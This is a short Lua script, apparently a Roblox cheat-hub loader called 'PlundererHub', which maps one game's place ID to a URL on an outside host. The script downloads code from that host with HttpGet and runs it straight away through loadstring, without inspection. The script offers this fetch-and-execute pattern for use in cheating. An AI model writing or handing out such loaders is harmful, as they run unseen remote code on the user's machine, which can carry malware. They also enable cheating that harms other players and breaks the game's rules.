local HttpGet = game:HttpGet

scriptkey = "KEY_HERE_F247FA524B3F458A"

local ROUTES = {
    -- Steal An Egg
    [107778070777162] = "https://api.redstoneguard.xyz/api/loader/f57732b2-b144-4aa4-8beb-80789d4ad6aa/init",

}

local function loadScriptForPlace()
    local placeId = game.PlaceId
    local url = ROUTES[placeId]

    if not url then
        warn("[PlundererHub] No script found for this game (PlaceId: " .. placeId .. ")")
        return
    end

    local success, err = pcall(function()
        loadstring(HttpGet(url))()
    end)

    if not success then
        warn("[PlundererHub] Failed to load script: " .. tostring(err))
    end
end

loadScriptForPlace()
